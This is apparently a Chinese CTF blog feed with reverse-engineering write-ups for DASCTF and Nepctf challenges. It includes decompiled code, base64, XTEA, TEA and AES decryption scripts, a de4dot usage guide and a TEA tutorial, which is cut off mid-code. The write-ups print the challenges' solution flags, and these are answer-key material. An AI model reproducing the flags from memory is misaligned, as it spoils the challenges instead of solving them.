        <content type="html"><![CDATA[<h1 id="Enjoyit-1"><a href="#Enjoyit-1" class="headerlink" title="Enjoyit-1"></a>Enjoyit-1</h1><a id="more"></a><p>首先查看文件信息</p><p><img src="/2021/03/28/DASCTF/1.png"></p><p>是C#文件，32位，放入dnSpy32位中。</p><p><img src="/2021/03/28/DASCTF/2.png"></p><p>第18行是输入判断，输入的字符范围为ASCII码95-122位。<br>第21行是变过密码表的base64加密并判断是否与yQXHyBvN3g/81gv51QXG1QTBxRr/yvXK1hC=相等。<br>第26-29行是一个循环，运行程序这个循环会运行100000秒。<br>第31行是xtea加密的变形。<br>第37-41行是一个异或。</p><h2 id="方法一：静态分析"><a href="#方法一：静态分析" class="headerlink" title="方法一：静态分析"></a>方法一：静态分析</h2><p>base64解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char a[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char b[]&#x3D;&quot;abcdefghijklmnopqrstuvwxyz0123456789+&#x2F;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x3D;&quot;;</span><br><span class="line">    char c[]&#x3D;&quot;yQXHyBvN3g&#x2F;81gv51QXG1QTBxRr&#x2F;yvXK1hC&#x3D;&quot;;</span><br><span class="line">    int i,j;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(a);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(b[j]&#x3D;&#x3D;c[i])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i]&#x3D;a[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>原密文:Y29tYnVzdGlibGVfb29sb25nX3RlYV9wbHo=<br>在线解密得：combustible_oolong_tea_plz</p></blockquote><p>有xtea加密得到的array：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"> </span><br><span class="line">void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[26]) &#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    uint32_t v0&#x3D;v[0], v1&#x3D;v[1], sum&#x3D;0, delta&#x3D;2654435464U;</span><br><span class="line">    for (i&#x3D;0; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 +&#x3D; (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);</span><br><span class="line">        sum +&#x3D; delta;</span><br><span class="line">        v1 +&#x3D; (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[0]&#x3D;v0; v[1]&#x3D;v1;</span><br><span class="line">&#125;</span><br><span class="line"> int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t v[2]&#x3D;&#123;288,369&#125;;</span><br><span class="line">    uint32_t const k[26]&#x3D;&#123;0x63,0x6f,0x6d,0x62,0x75,0x73,0x74,0x69,0x62,0x6c,0x65,0x5f,0x6f,0x6f,0x6c,0x6f,0x6e,0x67,0x5f,0x74,0x65,0x61,0x5f,0x70,0x6c,0x7a&#125;;</span><br><span class="line">    unsigned int r&#x3D;32;</span><br><span class="line">    encipher(r, v, k);</span><br><span class="line">    printf(&quot;%0x%0x&quot;,v[0],v[1]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将所得的数字当作字符串</p><blockquote><p>6308fe34b7fe6fdb</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char a[32]&#x3D;&#123; 2, 5, 4, 13, 3, 84, 11, 4, 87, 3, 86, 3, 80, 7, 83, 3, 0, 4, 83, 94, 7, 84, 4, 0, 1, 83, 3, 84, 6, 83, 5, 80 &#125;;</span><br><span class="line">    char b[16]&#x3D;&quot;6308fe34b7fe6fdb&quot;;</span><br><span class="line">    int i;</span><br><span class="line">    for(i&#x3D;0;i&lt;32;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i]&#x3D;a[i]^b[i%16];</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;flag&#123;%s&#125;&quot;,a);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{4645e180540ffa7a67cfa174cde105a2}</p></blockquote><h2 id="方法二：修改程序"><a href="#方法二：修改程序" class="headerlink" title="方法二：修改程序"></a>方法二：修改程序</h2><p>我们若直接输入combustible_oolong_tea_plz，程序运行100000秒后才会出flag，这是因为26-29行的循环。<br>只要把这个循环删去就行了。比静态分析简单多了。<br><img src="/2021/03/28/DASCTF/3.png"></p><blockquote><p>flag{4645e180540ffa7a67cfa174cde105a2}</p></blockquote><h1 id="drinkSomeTea"><a href="#drinkSomeTea" class="headerlink" title="drinkSomeTea"></a>drinkSomeTea</h1><p>32位文件，无壳</p><p><img src="/2021/03/28/DASCTF/4.PNG"></p><p>进入main函数f5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  HANDLE v3; &#x2F;&#x2F; eax</span><br><span class="line">  void *v4; &#x2F;&#x2F; esi</span><br><span class="line">  int result; &#x2F;&#x2F; eax</span><br><span class="line">  DWORD v6; &#x2F;&#x2F; edi</span><br><span class="line">  char *v7; &#x2F;&#x2F; esi</span><br><span class="line">  DWORD v8; &#x2F;&#x2F; ebx</span><br><span class="line">  HANDLE v9; &#x2F;&#x2F; eax</span><br><span class="line">  void *v10; &#x2F;&#x2F; esi</span><br><span class="line">  DWORD NumberOfBytesRead; &#x2F;&#x2F; [esp+Ch] [ebp-8h]</span><br><span class="line">  DWORD NumberOfBytesWritten; &#x2F;&#x2F; [esp+10h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  sub_401000();</span><br><span class="line">  sub_4013B2(aWelcomeToMyTea);</span><br><span class="line">  v3 &#x3D; CreateFileA(FileName, 0xC0000000, 0, 0, 3u, 0x80u, 0);</span><br><span class="line">  v4 &#x3D; v3;</span><br><span class="line">  if ( v3 &#x3D;&#x3D; -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4013B2(aIThinkYouDoNot);</span><br><span class="line">    result &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v6 &#x3D; GetFileSize(v3, 0);</span><br><span class="line">    if ( v6 &lt; 0xEA60 )</span><br><span class="line">    &#123;</span><br><span class="line">      SetFilePointer(v4, 0, 0, 0);</span><br><span class="line">      NumberOfBytesRead &#x3D; 0;</span><br><span class="line">      ReadFile(v4, &amp;unk_409988, v6, &amp;NumberOfBytesRead, 0);</span><br><span class="line">      CloseHandle(v4);</span><br><span class="line">      if ( (v6 &gt;&gt; 3) &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 &#x3D; &amp;unk_409988;</span><br><span class="line">        v8 &#x3D; v6 &gt;&gt; 3;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">          (loc_4010A0)(v7, &amp;unk_407030);</span><br><span class="line">          v7 +&#x3D; 8;</span><br><span class="line">          --v8;</span><br><span class="line">        &#125;</span><br><span class="line">        while ( v8 );</span><br><span class="line">      &#125;</span><br><span class="line">      v9 &#x3D; CreateFileA(aTeaPngOut, 0xC0000000, 0, 0, 2u, 0x80u, 0);</span><br><span class="line">      v10 &#x3D; v9;</span><br><span class="line">      if ( v9 &#x3D;&#x3D; -1 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_4013B2(aIThinkYouDoNot);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        NumberOfBytesWritten &#x3D; 0;</span><br><span class="line">        WriteFile(v9, &amp;unk_409988, v6, &amp;NumberOfBytesWritten, 0);</span><br><span class="line">        CloseHandle(v10);</span><br><span class="line">        sub_4013B2(aNowThisCupOfTe);</span><br><span class="line">      &#125;</span><br><span class="line">      result &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4013B2(aYourTeaIsTooHo);</span><br><span class="line">      result &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致意思就是读取tea.png，经过(loc_4010A0)(v7, &amp;unk_407030)后，得到了文件tea.png.out<br>loc_4010A0有一个花指令</p><p><img src="/2021/03/28/DASCTF/5.PNG"></p><p>按‘d’转为数据</p><p><img src="/2021/03/28/DASCTF/6.PNG"></p><p>nop掉0E8h，剩余部分按‘c’转为代码</p><p><img src="/2021/03/28/DASCTF/7.PNG"></p><p>按‘p’创建函数，然后就能f5了</p><p><img src="/2021/03/28/DASCTF/8.PNG"></p><p>密钥</p><p><img src="/2021/03/28/DASCTF/9.PNG"></p><p>这个tea加密的数据都是interesting型的，所以要将普通的脚本改一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void decrypt (int* v, int* k) </span><br><span class="line">&#123;</span><br><span class="line">    int v0&#x3D;v[0], v1&#x3D;v[1], sum&#x3D;0xC6EF3720, i;  &#x2F;* set up *&#x2F;</span><br><span class="line">    int delta&#x3D;0x9e3779b9;                     &#x2F;* a key schedule constant *&#x2F;</span><br><span class="line">    int k0&#x3D;k[0], k1&#x3D;k[1], k2&#x3D;k[2], k3&#x3D;k[3];   &#x2F;* cache key *&#x2F;</span><br><span class="line">    for (i&#x3D;0; i&lt;32; i++) &#123;                         &#x2F;* basic cycle start *&#x2F;</span><br><span class="line">        v1 -&#x3D; ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">        v0 -&#x3D; ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">        sum -&#x3D; delta;</span><br><span class="line">    &#125;                                              &#x2F;* end cycle *&#x2F;</span><br><span class="line">    v[0]&#x3D;v0; v[1]&#x3D;v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int v[14656];</span><br><span class="line">    int k[4]&#x3D;&#123;0x67616C66, 0x6B61667B, 0x6C665F65, 0x7D216761&#125;;</span><br><span class="line">    int i;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp &#x3D; fopen(&quot;.&#x2F;tea.png.out&quot;, &quot;rb&quot;);</span><br><span class="line">    fread(&amp;v, 4, 14656, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    for(i&#x3D;0;i&lt;14656;i+&#x3D;2)</span><br><span class="line">    &#123;</span><br><span class="line">        decrypt(&amp;v[i], k);</span><br><span class="line">    &#125;</span><br><span class="line">    fp &#x3D; fopen(&quot;.&#x2F;tea.png&quot;, &quot;wb&quot;);</span><br><span class="line">    fwrite(&amp;v, 4, 14656, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/03/28/DASCTF/tea.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nepctf</title>
      <link href="2021/03/28/Nepctf/"/>
      <url>2021/03/28/Nepctf/</url>
      
        <content type="html"><![CDATA[<h1 id="hardcsharp"><a href="#hardcsharp" class="headerlink" title="hardcsharp"></a>hardcsharp</h1><a id="more"></a><p>⽤dnspy32位打开，可发现是aes加密<br>反编译代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line"></span><br><span class="line">namespace hardcsharp</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; Token: 0x02000002 RID: 2</span><br><span class="line">internal class Program</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250</span><br><span class="line">private static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">AesClass aesClass &#x3D; new AesClass();</span><br><span class="line">string text &#x3D; &quot;&quot;;</span><br><span class="line">string strB &#x3D; </span><br><span class="line">&quot;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH&#x2F;3Wh0&quot;;</span><br><span class="line">byte[] array &#x3D; new byte[]</span><br><span class="line">&#123;</span><br><span class="line">81, 82, 87, 81, 82, 87, 68, 92, 94, 86, 93, 18, 18, 18, 18, 18, 18, 18, 18, </span><br><span class="line">18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18</span><br><span class="line">&#125;;</span><br><span class="line">Console.WriteLine(&quot;Welcome to nepnep csharp test! plz input the magical code:&quot;);</span><br><span class="line">string text2 &#x3D; Console.ReadLine();</span><br><span class="line">if (text2.Length !&#x3D; 37)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(&quot;Nope!&quot;);</span><br><span class="line">Console.ReadKey();</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">if (text2.Substring(0, 4) !&#x3D; &quot;Nep&#123;&quot; || text2[36] !&#x3D; &#39;&#125;&#39;)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(&quot;Nope!&quot;);</span><br><span class="line">Console.ReadKey();</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">for (int i &#x3D; 0; i &lt; 32; i++)</span><br><span class="line">&#123;</span><br><span class="line">text +&#x3D; Convert.ToChar((int)(array[i] ^ 51)).ToString();</span><br><span class="line">&#125;</span><br><span class="line">if (string.Compare(aesClass.AesEncrypt(text2, text), strB) &#x3D;&#x3D; 0)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(&quot;wow, you pass it!&quot;);</span><br><span class="line">Console.ReadKey();</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">Console.WriteLine(&quot;Nope!&quot;);</span><br><span class="line">Console.ReadKey();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public string AesEncrypt(string str, string key)</span><br><span class="line">&#123;</span><br><span class="line">if (string.IsNullOrEmpty(str))</span><br><span class="line">&#123;</span><br><span class="line">return null;</span><br><span class="line">&#125;</span><br><span class="line">byte[] bytes &#x3D; Encoding.UTF8.GetBytes(str);</span><br><span class="line">byte[] array &#x3D; new RijndaelManaged</span><br><span class="line">&#123;</span><br><span class="line">Key &#x3D; Encoding.UTF8.GetBytes(key),</span><br><span class="line">Mode &#x3D; CipherMode.ECB,</span><br><span class="line">Padding &#x3D; PaddingMode.PKCS7</span><br><span class="line">&#125;.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length);</span><br><span class="line">return Convert.ToBase64String(array, 0, array.Length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可知AES模式为ECB，填充模式为PKCS7Padding<br>解出来密钥：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int num[32]&#x3D;&#123;81, 82, 87, 81, 82, 87, 68, 92, 94, 86, 93, 18, 18, 18, 18, 18, 18, 18, </span><br><span class="line">    18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18&#125;;</span><br><span class="line">    int i;</span><br><span class="line">    for (i&#x3D;0;i&lt;32;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        num[i]^&#x3D;51;</span><br><span class="line">    &#125;</span><br><span class="line">    for (i&#x3D;0;i&lt;32;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,num[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>密钥：badbadwomen!!!!!!!!!!!!!!!!!!!!!</p></blockquote><p>在线解密</p><p><img src="/2021/03/28/Nepctf/1.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;up_up_down_down_B_a_b_A_Nep_nep~&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>de4dot反混淆工具</title>
      <link href="2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/"/>
      <url>2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>找到下载好的文件所在的位置</p><a id="more"></a><p><img src="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/1.png"></p><p>按住shift选择并右击，选择打开Powershell窗口</p><p><img src="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/2.png"></p><p> 输入.\De4Dot [目标文件的路径]</p><p><img src="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/4.png"></p><p>会生成一个名为：原文件名–cleaned.exe</p><p>去混淆前<br><img src="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/5.png"></p><p>去混淆后</p><p><img src="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>喝茶吗</title>
      <link href="2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/"/>
      <url>2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/</url>
      
        <content type="html"><![CDATA[<h1 id="一个神奇的加密"><a href="#一个神奇的加密" class="headerlink" title="一个神奇的加密"></a>一个神奇的加密</h1><a id="more"></a><h2 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h2><p><a href="https://blog.csdn.net/gsls200808/article/details/48243019">参考链接</a></p><h3 id="tea加密"><a href="#tea加密" class="headerlink" title="tea加密"></a>tea加密</h3><p>在密码学中，微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。其设计者是剑桥大学计算机实验室的大卫·惠勒与罗杰·尼达姆。这项技术最初于1994年提交给鲁汶的快速软件加密的研讨会上，并在该研讨会上演讲中首次发表。</p><p>在给出的代码中：加密使用的数据为2个32位无符号整数，密钥为4个32位无符号整数即密钥长度为128位<br>加密过程：<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/1.png"><br>算法实现：</p><p>C语言代码（需支持C99）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;加密函数</span><br><span class="line">void encrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0&#x3D;v[0], v1&#x3D;v[1], sum&#x3D;0, i;           &#x2F;* set up *&#x2F;</span><br><span class="line">    uint32_t delta&#x3D;0x9e3779b9;                     &#x2F;* a key schedule constant *&#x2F;</span><br><span class="line">    uint32_t k0&#x3D;k[0], k1&#x3D;k[1], k2&#x3D;k[2], k3&#x3D;k[3];   &#x2F;* cache key *&#x2F;</span><br><span class="line">    for (i&#x3D;0; i &lt; 32; i++) &#123;                       &#x2F;* basic cycle start *&#x2F;</span><br><span class="line">        sum +&#x3D; delta;</span><br><span class="line">        v0 +&#x3D; ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">        v1 +&#x3D; ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">    &#125;                                              &#x2F;* end cycle *&#x2F;</span><br><span class="line">    v[0]&#x3D;v0; v[1]&#x3D;v1;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;解密函数</span><br><span class="line">void decrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0&#x3D;v[0], v1&#x3D;v[1], sum&#x3D;0xC6EF3720, i;  &#x2F;* set up *&#x2F;</span><br><span class="line">    uint32_t delta&#x3D;0x9e3779b9;                     &#x2F;* a key schedule constant *&#x2F;</span><br><span class="line">    uint32_t k0&#x3D;k[0], k1&#x3D;k[1], k2&#x3D;k[2], k3&#x3D;k[3];   &#x2F;* cache key *&#x2F;</span><br><span class="line">    for (i&#x3D;0; i&lt;32; i++) &#123;                         &#x2F;* basic cycle start *&#x2F;</span><br><span class="line">        v1 -&#x3D; ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">        v0 -&#x3D; ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">        sum -&#x3D; delta;</span><br><span class="line">    &#125;                                              &#x2F;* end cycle *&#x2F;</span><br><span class="line">    v[0]&#x3D;v0; v[1]&#x3D;v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t v[2]&#x3D;&#123;1,2&#125;,k[4]&#x3D;&#123;2,2,3,4&#125;;</span><br><span class="line">    &#x2F;&#x2F; v为要加密的数据是两个32位无符号整数</span><br><span class="line">    &#x2F;&#x2F; k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br><span class="line">    printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    encrypt(v, 